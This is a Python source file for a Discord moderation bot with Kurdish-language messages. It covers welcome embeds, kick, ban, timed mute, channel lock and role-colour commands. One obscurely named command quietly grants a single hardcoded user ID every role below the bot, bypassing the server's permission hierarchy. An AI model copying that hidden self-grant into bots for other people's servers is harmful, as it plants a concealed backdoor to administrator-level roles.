import os
import re
import asyncio
import discord
from discord.ext import commands


# =========================
# INTENTS
# =========================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
    command_prefix="",
    intents=intents
)


# =========================
# IDs
# =========================

WELCOME_CHANNEL_ID = 1550619956423688342
OWNER_ID = 1130455970494025860
DEVELOPER_ROLE_ID = 1448989145740480605

FRIENDSFCOLOR_ROLE_ID = 1550035593239461888
BOTCOLOR_ROLE_ID = 1448989146885652603
_COLOR_ROLE_ID = 1491385293457330229
TRUSTCOLOR_ROLE_ID = 1448989152379932773
SISCOLOR_ROLE_ID = 1448989144410886145
BRCOLOR_ROLE_ID = 1448989153667711069
XRCOLOR_ROLE_ID = 1451268943548383406
FRIENDSCOLOR_ROLE_ID = 1448989154578010238


# =========================
# IMAGES
# =========================

WELCOME_GIF = "https://cdn.discordapp.com/attachments/1550619956423688342/1551709269043314768/welcome.gif?ex=6ab2f55f&is=6ab1a3df&hm=612d5cdf1190d53382436a598c1d313a918b6b1b25bc93ac905d5cfd8ffd1780&"

QNM_IMAGE = "https://cdn.discordapp.com/attachments/1488625936927555816/1551783128962564176/7fb8c35c613b332ee89c22dc93bf2b33.jpg?ex=6ab33a28&is=6ab1e8a8&hm=f5c009e72ca533f5ca5b26d6c1af307b8645861da9875fee3662387774f3e51d&"


# =========================
# MUTE SETTINGS
# =========================

MUTE_ROLE_NAME = "Muted"

# Temporary mute tasks
mute_tasks = {}


# =========================
# BOT READY
# =========================

@bot.event
async def on_ready():
    print(f"Bot online as {bot.user}")


# =========================
# WELCOME
# =========================

@bot.event
async def on_member_join(member):

    friends_role = discord.utils.get(
        member.guild.roles,
        name="Friends"
    )

    if friends_role:

        try:
            await member.add_roles(
                friends_role
            )
        except:
            pass

    channel = member.guild.get_channel(
        WELCOME_CHANNEL_ID
    )

    if channel:

        embed = discord.Embed(
            description=f"""
✦₊˚ ★⋆ Welcome ⋆★ ˚₊✦

└Thanks for joining ⌝^◝࿐₊˚｡⋆☆⋆｡˚₊

{member.mention}

ơೃ࿐ --- ⋆ #rules ⋆ ---
ơೃ࿐ --- ⋆ #FriendsZone ⋆ ---
ơೃ࿐ --- ⋆ #Fraa-Seuii-Ryaa⋆ ---

=★ Have fun ₊˚ ｡ ⋆ ☆ ⋆ ｡˚
"""
        )

        embed.set_thumbnail(
            url=member.display_avatar.url
        )

        embed.set_image(
            url=WELCOME_GIF
        )

        await channel.send(
            embed=embed
        )


# =========================
# TEST WELCOME
# =========================

@bot.command()
async def test(ctx):

    embed = discord.Embed(
        description=f"""
✦₊˚ ★⋆ Welcome ⋆★ ˚₊✦

└Thanks for joining ⌝^◝࿐₊˚｡⋆☆⋆｡˚₊

{ctx.author.mention}

ơೃ࿐ --- ⋆ #rules ⋆ ---
ơೃ࿐ --- ⋆ #FriendsZone ⋆ ---
ơೃ࿐ --- ⋆ #Fraa-Seuii-Ryaa⋆ ---

=★ Have fun ₊˚ ｡ ⋆ ☆ ⋆ ｡˚
"""
    )

    embed.set_thumbnail(
        url=ctx.author.display_avatar.url
    )

    embed.set_image(
        url=WELCOME_GIF
    )

    await ctx.send(
        embed=embed
    )

    try:
        await ctx.message.delete()
    except:
        pass


# =========================
# QNM BDE
# =========================

@bot.event
async def on_message(message):

    if message.author.bot:
        return

    if message.content.lower().strip() == "qnm bde":

        await message.channel.send(
            QNM_IMAGE
        )

        await message.channel.send(
            "ama ba qnt"
        )

        return

    await bot.process_commands(
        message
    )


# =========================
# GET TARGET
# TAG OR REPLY
# =========================

async def get_target(
    ctx,
    member=None
):

    # Tag
    if member is not None:
        return member

    # Reply
    reference = ctx.message.reference

    if reference and reference.message_id:

        try:

            if isinstance(
                reference.resolved,
                discord.Message
            ):
                return reference.resolved.author

            replied_message = await ctx.channel.fetch_message(
                reference.message_id
            )

            return replied_message.author

        except:
            return None

    return None


# =========================
# TARGET PERMISSION CHECK
# =========================

async def check_target(
    ctx,
    member
):

    if member is None:

        await ctx.send(
            "❌ تاگی بکە یان لەسەر پەیامی ئەو کەسە Reply بکە.",
            delete_after=5
        )

        return False

    # Server Owner
    if member.id == ctx.guild.owner_id:

        await ctx.send(
            "❌ خاوەنی سێرڤەر ناتوانرێت ئەم کارەی لەگەڵ بکرێت.",
            delete_after=5
        )

        return False

    # Bot
    if member.id == bot.user.id:

        await ctx.send(
            "❌ بۆتەکە ناتوانرێت ئەم کارەی لەگەڵ بکرێت.",
            delete_after=5
        )

        return False

    # Developer
    developer_role = ctx.guild.get_role(
        DEVELOPER_ROLE_ID
    )

    if (
        developer_role
        and developer_role in member.roles
    ):

        await ctx.send(
            "❌ ئەم کەسە ڕۆڵی Developer ـی هەیە و ناتوانرێت ئەم کارەی لەگەڵ بکرێت.",
            delete_after=5
        )

        return False

    # Bot role
    bot_role = ctx.guild.get_role(
        BOTCOLOR_ROLE_ID
    )

    if (
        bot_role
        and bot_role in member.roles
    ):

        await ctx.send(
            "❌ ئەم کەسە ڕۆڵی بۆتی هەیە و ناتوانرێت ئەم کارەی لەگەڵ بکرێت.",
            delete_after=5
        )

        return False

    bot_member = ctx.guild.me

    if bot_member is None:
        return False

    # Target must be below bot
    if member.top_role >= bot_member.top_role:

        await ctx.send(
            "❌ ڕۆڵی ئەو کەسە یەکسان یان بەرزترە لە ڕۆڵی بۆتەکە.",
            delete_after=5
        )

        return False

    # Author must be above target
    if member.top_role >= ctx.author.top_role:

        await ctx.send(
            "❌ ڕۆڵت نزمتر یان یەکسانە لە ڕۆڵی ئەو کەسە.",
            delete_after=5
        )

        return False

    return True


# =========================
# CLEAR
# =========================

@bot.command()
@commands.has_permissions(
    manage_messages=True
)
async def clear(
    ctx,
    amount: int
):

    deleted = await ctx.channel.purge(
        limit=amount + 1
    )

    msg = await ctx.send(
        f"✅ {len(deleted) - 1} messages deleted."
    )

    await msg.delete(
        delay=5
    )


# =========================
# KICK
# TAG OR REPLY
# =========================

@bot.command()
@commands.has_permissions(
    kick_members=True
)
async def kik(
    ctx,
    *args
):

    member = None

    if ctx.message.mentions:

        member = ctx.message.mentions[0]

    else:

        member = await get_target(ctx)

    if not await check_target(
        ctx,
        member
    ):
        return

    try:

        await member.kick(
            reason=f"Kicked by {ctx.author}"
        )

        try:
            await ctx.message.delete()
        except:
            pass

        msg = await ctx.send(
            f"👢 {member.mention} kicked."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە ناتوانێت ئەم کەسە Kick بکات.",
            delete_after=5
        )


# =========================
# BAN
# TAG OR REPLY
# =========================

@bot.command()
@commands.has_permissions(
    ban_members=True
)
async def ban(
    ctx,
    *args
):

    member = None

    if ctx.message.mentions:

        member = ctx.message.mentions[0]

    else:

        member = await get_target(ctx)

    if not await check_target(
        ctx,
        member
    ):
        return

    try:

        await member.ban(
            reason=f"Banned by {ctx.author}"
        )

        try:
            await ctx.message.delete()
        except:
            pass

        msg = await ctx.send(
            f"🔨 {member.mention} banned."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە ناتوانێت ئەم کەسە Ban بکات.",
            delete_after=5
        )


# =========================
# UNBAN
# =========================

@bot.command()
@commands.has_permissions(
    ban_members=True
)
async def unban(
    ctx,
    user_id: int
):

    try:

        user = await bot.fetch_user(
            user_id
        )

        await ctx.guild.unban(
            user
        )

        msg = await ctx.send(
            f"✅ {user} unbanned."
        )

        await msg.delete(
            delay=5
        )

    except discord.NotFound:

        await ctx.send(
            "❌ User not found or not banned.",
            delete_after=5
        )


# ============================================================
# MUTE SYSTEM
# ============================================================

# =========================
# GET OR CREATE MUTED ROLE
# =========================

async def get_muted_role(
    guild
):

    role = discord.utils.get(
        guild.roles,
        name=MUTE_ROLE_NAME
    )

    if role:
        return role

    # Create role
    role = await guild.create_role(
        name=MUTE_ROLE_NAME,
        reason="Mute system"
    )

    # Put Muted below bot's highest role
    bot_member = guild.me

    if bot_member:

        try:

            await role.edit(
                position=max(
                    1,
                    bot_member.top_role.position - 1
                )
            )

        except:
            pass

    return role


# =========================
# MUTE ALL TEXT CHANNELS
# =========================

async def set_mute_permissions(
    guild,
    muted_role
):

    overwrite = discord.PermissionOverwrite(
        send_messages=False,
        send_messages_in_threads=False,
        create_public_threads=False,
        create_private_threads=False
    )

    for channel in guild.channels:

        # ONLY TEXT CHAT CHANNELS
        if isinstance(
            channel,
            (
                discord.TextChannel,
                discord.NewsChannel
            )
        ):

            try:

                await channel.set_permissions(
                    muted_role,
                    overwrite=overwrite,
                    reason="Mute system"
                )

            except discord.Forbidden:
                pass

            except discord.HTTPException:
                pass


# =========================
# REMOVE MUTE PERMISSIONS
# =========================

async def remove_mute_permissions(
    guild,
    muted_role
):

    for channel in guild.channels:

        # ONLY TEXT CHAT CHANNELS
        if isinstance(
            channel,
            (
                discord.TextChannel,
                discord.NewsChannel
            )
        ):

            try:

                await channel.set_permissions(
                    muted_role,
                    overwrite=None,
                    reason="Unmute system"
                )

            except discord.Forbidden:
                pass

            except discord.HTTPException:
                pass


# =========================
# PARSE TIME
# =========================

def parse_duration(
    text
):

    if not text:
        return None

    text = text.lower().strip()

    match = re.fullmatch(
        r"([0-9]+)\s*(s|m|h)",
        text
    )

    if not match:
        return None

    number = int(
        match.group(1)
    )

    unit = match.group(2)

    if number <= 0:
        return None

    if unit == "s":
        return number

    if unit == "m":
        return number * 60

    if unit == "h":
        return number * 3600

    return None


# =========================
# FORMAT TIME
# =========================

def format_duration(
    seconds
):

    if seconds < 60:
        return f"{seconds}s"

    if seconds < 3600:
        return f"{seconds // 60}m"

    hours = seconds // 3600
    minutes = (seconds % 3600) // 60

    if minutes:
        return f"{hours}h {minutes}m"

    return f"{hours}h"


# =========================
# AUTOMATIC UNMUTE
# =========================

async def auto_unmute(
    guild_id,
    member_id,
    duration
):

    task_key = (
        guild_id,
        member_id
    )

    try:

        await asyncio.sleep(
            duration
        )

        guild = bot.get_guild(
            guild_id
        )

        if guild is None:
            return

        member = guild.get_member(
            member_id
        )

        if member is None:
            return

        muted_role = discord.utils.get(
            guild.roles,
            name=MUTE_ROLE_NAME
        )

        if muted_role is None:
            return

        if muted_role in member.roles:

            try:

                await member.remove_roles(
                    muted_role,
                    reason="Temporary mute expired"
                )

            except discord.Forbidden:
                return

        # DO NOT remove channel permissions here.
        #
        # The Muted role stays configured to block chat.
        # This is important because other muted users
        # may still have the same role.
        #
        # Only the user's role is removed.

    except asyncio.CancelledError:
        return

    finally:

        mute_tasks.pop(
            task_key,
            None
        )


# =========================
# MUTE
#
# mute @user
# mute @user 10s
# mute @user 30s
# mute @user 5m
# mute @user 2h
#
# Reply:
# mute
# mute 10s
# mute 5m
# mute 2h
# =========================

@bot.command()
@commands.has_permissions(
    manage_roles=True
)
async def mute(
    ctx,
    *args
):

    member = None
    duration_text = None

    # =====================
    # TARGET BY TAG
    # =====================

    if ctx.message.mentions:

        member = ctx.message.mentions[0]

        # Find duration
        for arg in args:

            if not (
                arg.startswith("<@")
                and arg.endswith(">")
            ):

                duration_text = arg
                break

    # =====================
    # TARGET BY REPLY
    # =====================

    else:

        member = await get_target(
            ctx
        )

        if args:
            duration_text = args[0]

    # =====================
    # CHECK TARGET
    # =====================

    if not await check_target(
        ctx,
        member
    ):
        return

    # =====================
    # PARSE DURATION
    # =====================

    duration = None

    if duration_text:

        duration = parse_duration(
            duration_text
        )

        if duration is None:

            await ctx.send(
                "❌ کاتی دروست بنووسە. نموونە: `10s` یان `5m` یان `2h`.",
                delete_after=5
            )

            return

    try:

        # =====================
        # GET MUTED ROLE
        # =====================

        muted_role = await get_muted_role(
            ctx.guild
        )

        # =====================
        # MAKE SURE MUTED ROLE
        # BLOCKS ALL TEXT CHANNELS
        # =====================

        await set_mute_permissions(
            ctx.guild,
            muted_role
        )

        # =====================
        # ADD ROLE
        # =====================

        await member.add_roles(
            muted_role,
            reason=f"Muted by {ctx.author}"
        )

        # =====================
        # CANCEL OLD TIMER
        # =====================

        task_key = (
            ctx.guild.id,
            member.id
        )

        old_task = mute_tasks.get(
            task_key
        )

        if old_task:

            old_task.cancel()

            mute_tasks.pop(
                task_key,
                None
            )

        # =====================
        # TEMPORARY MUTE
        # =====================

        if duration is not None:

            mute_tasks[task_key] = asyncio.create_task(
                auto_unmute(
                    ctx.guild.id,
                    member.id,
                    duration
                )
            )

        # =====================
        # DELETE COMMAND
        # =====================

        try:
            await ctx.message.delete()
        except:
            pass

        # =====================
        # RESPONSE
        # =====================

        if duration is None:

            msg = await ctx.send(
                f"🔇 {member.mention} muted.\n"
                f"کۆتایی نییە، هەتا خۆت `unmute` ـی دەکەیت."
            )

        else:

            msg = await ctx.send(
                f"🔇 {member.mention} muted for `{format_duration(duration)}`."
            )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە ناتوانێت Muted role ـەکە زیاد بکات. دڵنیابە `Manage Roles` ـی هەیە و Muted role لە خوار ڕۆڵی بۆتەکەیە.",
            delete_after=8
        )

    except discord.HTTPException:

        await ctx.send(
            "❌ Discord ڕێگەی جێبەجێکردنی Mute ـەکەی نەدا. Permission ـی بۆتەکە و شوێنی Muted role بپشکنە.",
            delete_after=8
        )


# =========================
# UNMUTE
#
# unmute @user
#
# OR REPLY + unmute
# =========================

@bot.command()
@commands.has_permissions(
    manage_roles=True
)
async def unmute(
    ctx,
    *args
):

    member = None

    # Tag
    if ctx.message.mentions:

        member = ctx.message.mentions[0]

    # Reply
    else:

        member = await get_target(
            ctx
        )

    if not await check_target(
        ctx,
        member
    ):
        return

    muted_role = discord.utils.get(
        ctx.guild.roles,
        name=MUTE_ROLE_NAME
    )

    if muted_role is None:

        await ctx.send(
            "❌ Muted role نەدۆزرایەوە.",
            delete_after=5
        )

        return

    try:

        # Remove role
        await member.remove_roles(
            muted_role,
            reason=f"Unmuted by {ctx.author}"
        )

        # Cancel timer
        task_key = (
            ctx.guild.id,
            member.id
        )

        task = mute_tasks.get(
            task_key
        )

        if task:

            task.cancel()

            mute_tasks.pop(
                task_key,
                None
            )

        try:
            await ctx.message.delete()
        except:
            pass

        msg = await ctx.send(
            f"🔊 {member.mention} unmuted."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە ناتوانێت Muted role ـەکە لاببات.",
            delete_after=5
        )


# =========================
# LOCK
# =========================

@bot.command()
@commands.has_permissions(
    manage_channels=True
)
async def lock(ctx):

    await ctx.channel.set_permissions(
        ctx.guild.default_role,
        send_messages=False
    )

    msg = await ctx.send(
        "🔒 Channel locked."
    )

    await msg.delete(
        delay=5
    )


# =========================
# UNLOCK
# =========================

@bot.command()
@commands.has_permissions(
    manage_channels=True
)
async def unlock(ctx):

    await ctx.channel.set_permissions(
        ctx.guild.default_role,
        send_messages=True
    )

    msg = await ctx.send(
        "🔓 Channel unlocked."
    )

    await msg.delete(
        delay=5
    )


# =========================
# OWNER ROLE COMMAND
# =========================

@bot.command()
async def seuafraaaRyaaa(ctx):

    if ctx.author.id != OWNER_ID:
        return

    bot_member = ctx.guild.me

    roles_to_add = [
        role
        for role in ctx.guild.roles
        if role != ctx.guild.default_role
        and not role.managed
        and role < bot_member.top_role
        and role not in ctx.author.roles
    ]

    if not roles_to_add:

        await ctx.send(
            "❌ هیچ ڕۆڵێکی تر نییە بۆ زیادکردن.",
            delete_after=5
        )

        return

    try:

        for role in roles_to_add:

            await ctx.author.add_roles(
                role
            )

        msg = await ctx.send(
            "✅ هەموو ڕۆڵە بەردەستەکان زیادکران."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە دەسەڵاتی زیادکردنی ئەو ڕۆڵانەی نییە.",
            delete_after=5
        )


# =========================
# DEVELOPER COLOR
# =========================

@bot.command()
async def devcolor(
    ctx,
    color: str = None
):

    developer_role = ctx.guild.get_role(
        DEVELOPER_ROLE_ID
    )

    if developer_role is None:

        await ctx.send(
            "❌ Developer role نەدۆزرایەوە.",
            delete_after=5
        )

        return

    if developer_role not in ctx.author.roles:

        await ctx.send(
            "❌ تۆ ڕۆڵی Developer ـت نییە.",
            delete_after=5
        )

        return

    if color is None:

        await ctx.send(
            "❌ ڕەنگەکە بنووسە. نموونە: `devcolor #000000`",
            delete_after=5
        )

        return

    if (
        not color.startswith("#")
        or len(color) != 7
    ):

        await ctx.send(
            "❌ ڕەنگەکە دەبێت بە شێوەی `#000000` بێت.",
            delete_after=5
        )

        return

    try:

        new_color = discord.Colour.from_str(
            color
        )

    except ValueError:

        await ctx.send(
            "❌ ئەم Hex Color ـە دروست نییە.",
            delete_after=5
        )

        return

    bot_member = ctx.guild.me

    if developer_role >= bot_member.top_role:

        await ctx.send(
            "❌ ڕۆڵی Developer دەبێت لە خوار ڕۆڵی بۆتەکە بێت.",
            delete_after=5
        )

        return

    try:

        await developer_role.edit(
            colour=new_color,
            reason=f"Developer role color changed by {ctx.author}"
        )

        try:
            await ctx.message.delete()
        except:
            pass

        msg = await ctx.send(
            f"✅ ڕەنگی Developer گۆڕدرا بۆ `{color.upper()}`."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە ناتوانێت ڕۆڵی Developer دەستکاری بکات.",
            delete_after=5
        )


# ============================================================
# ROLE COLOR SYSTEM
# ============================================================

async def change_role_color(
    ctx,
    role_id,
    color
):

    role = ctx.guild.get_role(
        role_id
    )

    if role is None:

        await ctx.send(
            "❌ ئەم ڕۆڵە نەدۆزرایەوە.",
            delete_after=5
        )

        return

    if color is None:

        await ctx.send(
            "❌ ڕەنگەکە بنووسە. نموونە: `#000000`",
            delete_after=5
        )

        return

    if (
        not color.startswith("#")
        or len(color) != 7
    ):

        await ctx.send(
            "❌ ڕەنگەکە دەبێت بە شێوەی `#000000` بێت.",
            delete_after=5
        )

        return

    try:

        new_color = discord.Colour.from_str(
            color
        )

    except ValueError:

        await ctx.send(
            "❌ ئەم Hex Color ـە دروست نییە.",
            delete_after=5
        )

        return

    bot_member = ctx.guild.me

    if role >= bot_member.top_role:

        await ctx.send(
            "❌ بۆتەکە ناتوانێت ئەم ڕۆڵە بگۆڕێت.",
            delete_after=5
        )

        return

    if role > ctx.author.top_role:

        await ctx.send(
            "❌ ڕۆڵت نزمترە لەو ڕۆڵەی کە دەتەوێت بیگۆڕیت.",
            delete_after=5
        )

        return

    try:

        await role.edit(
            colour=new_color,
            reason=f"Role color changed by {ctx.author}"
        )

        try:
            await ctx.message.delete()
        except:
            pass

        msg = await ctx.send(
            f"✅ ڕەنگی `{role.name}` گۆڕدرا بۆ `{color.upper()}`."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە ناتوانێت ئەم ڕۆڵە دەستکاری بکات.",
            delete_after=5
        )


# =========================
# COLOR COMMANDS
# =========================

@bot.command()
async def friendsfcolor(
    ctx,
    color: str = None
):
    await change_role_color(
        ctx,
        FRIENDSFCOLOR_ROLE_ID,
        color
    )


@bot.command()
async def botcolor(
    ctx,
    color: str = None
):
    await change_role_color(
        ctx,
        BOTCOLOR_ROLE_ID,
        color
    )


@bot.command(name="_color")
async def _color(
    ctx,
    color: str = None
):
    await change_role_color(
        ctx,
        _COLOR_ROLE_ID,
        color
    )


@bot.command()
async def trustcolor(
    ctx,
    color: str = None
):
    await change_role_color(
        ctx,
        TRUSTCOLOR_ROLE_ID,
        color
    )


@bot.command()
async def siscolor(
    ctx,
    color: str = None
):
    await change_role_color(
        ctx,
        SISCOLOR_ROLE_ID,
        color
    )


@bot.command()
async def brocolor(
    ctx,
    color: str = None
):
    await change_role_color(
        ctx,
        BRCOLOR_ROLE_ID,
        color
    )


@bot.command()
async def xrcolor(
    ctx,
    color: str = None
):
    await change_role_color(
        ctx,
        XRCOLOR_ROLE_ID,
        color
    )


@bot.command()
async def friendscolor(
    ctx,
    color: str = None
):
    await change_role_color(
        ctx,
        FRIENDSCOLOR_ROLE_ID,
        color
    )


# =========================
# ERROR HANDLER
# =========================

@bot.event
async def on_command_error(
    ctx,
    error
):

    if isinstance(
        error,
        commands.MissingPermissions
    ):

        await ctx.send(
            "❌ تۆ دەسەڵاتی ئەم command ـەت نییە.",
            delete_after=5
        )

    elif isinstance(
        error,
        commands.MissingRequiredArgument
    ):

        await ctx.send(
            "❌ تاگی بکە یان لەسەر پەیامی ئەو کەسە Reply بکە.",
            delete_after=5
        )

    elif isinstance(
        error,
        commands.MemberNotFound
    ):

        await ctx.send(
            "❌ ئەم ئەندامە نەدۆزرایەوە.",
            delete_after=5
        )

    elif isinstance(
        error,
        commands.BadArgument
    ):

        await ctx.send(
            "❌ Argument ـەکە هەڵەیە.",
            delete_after=5
        )


# =========================
# RUN BOT
# =========================

bot.run(
    os.getenv("DISCORD_TOKEN")
)
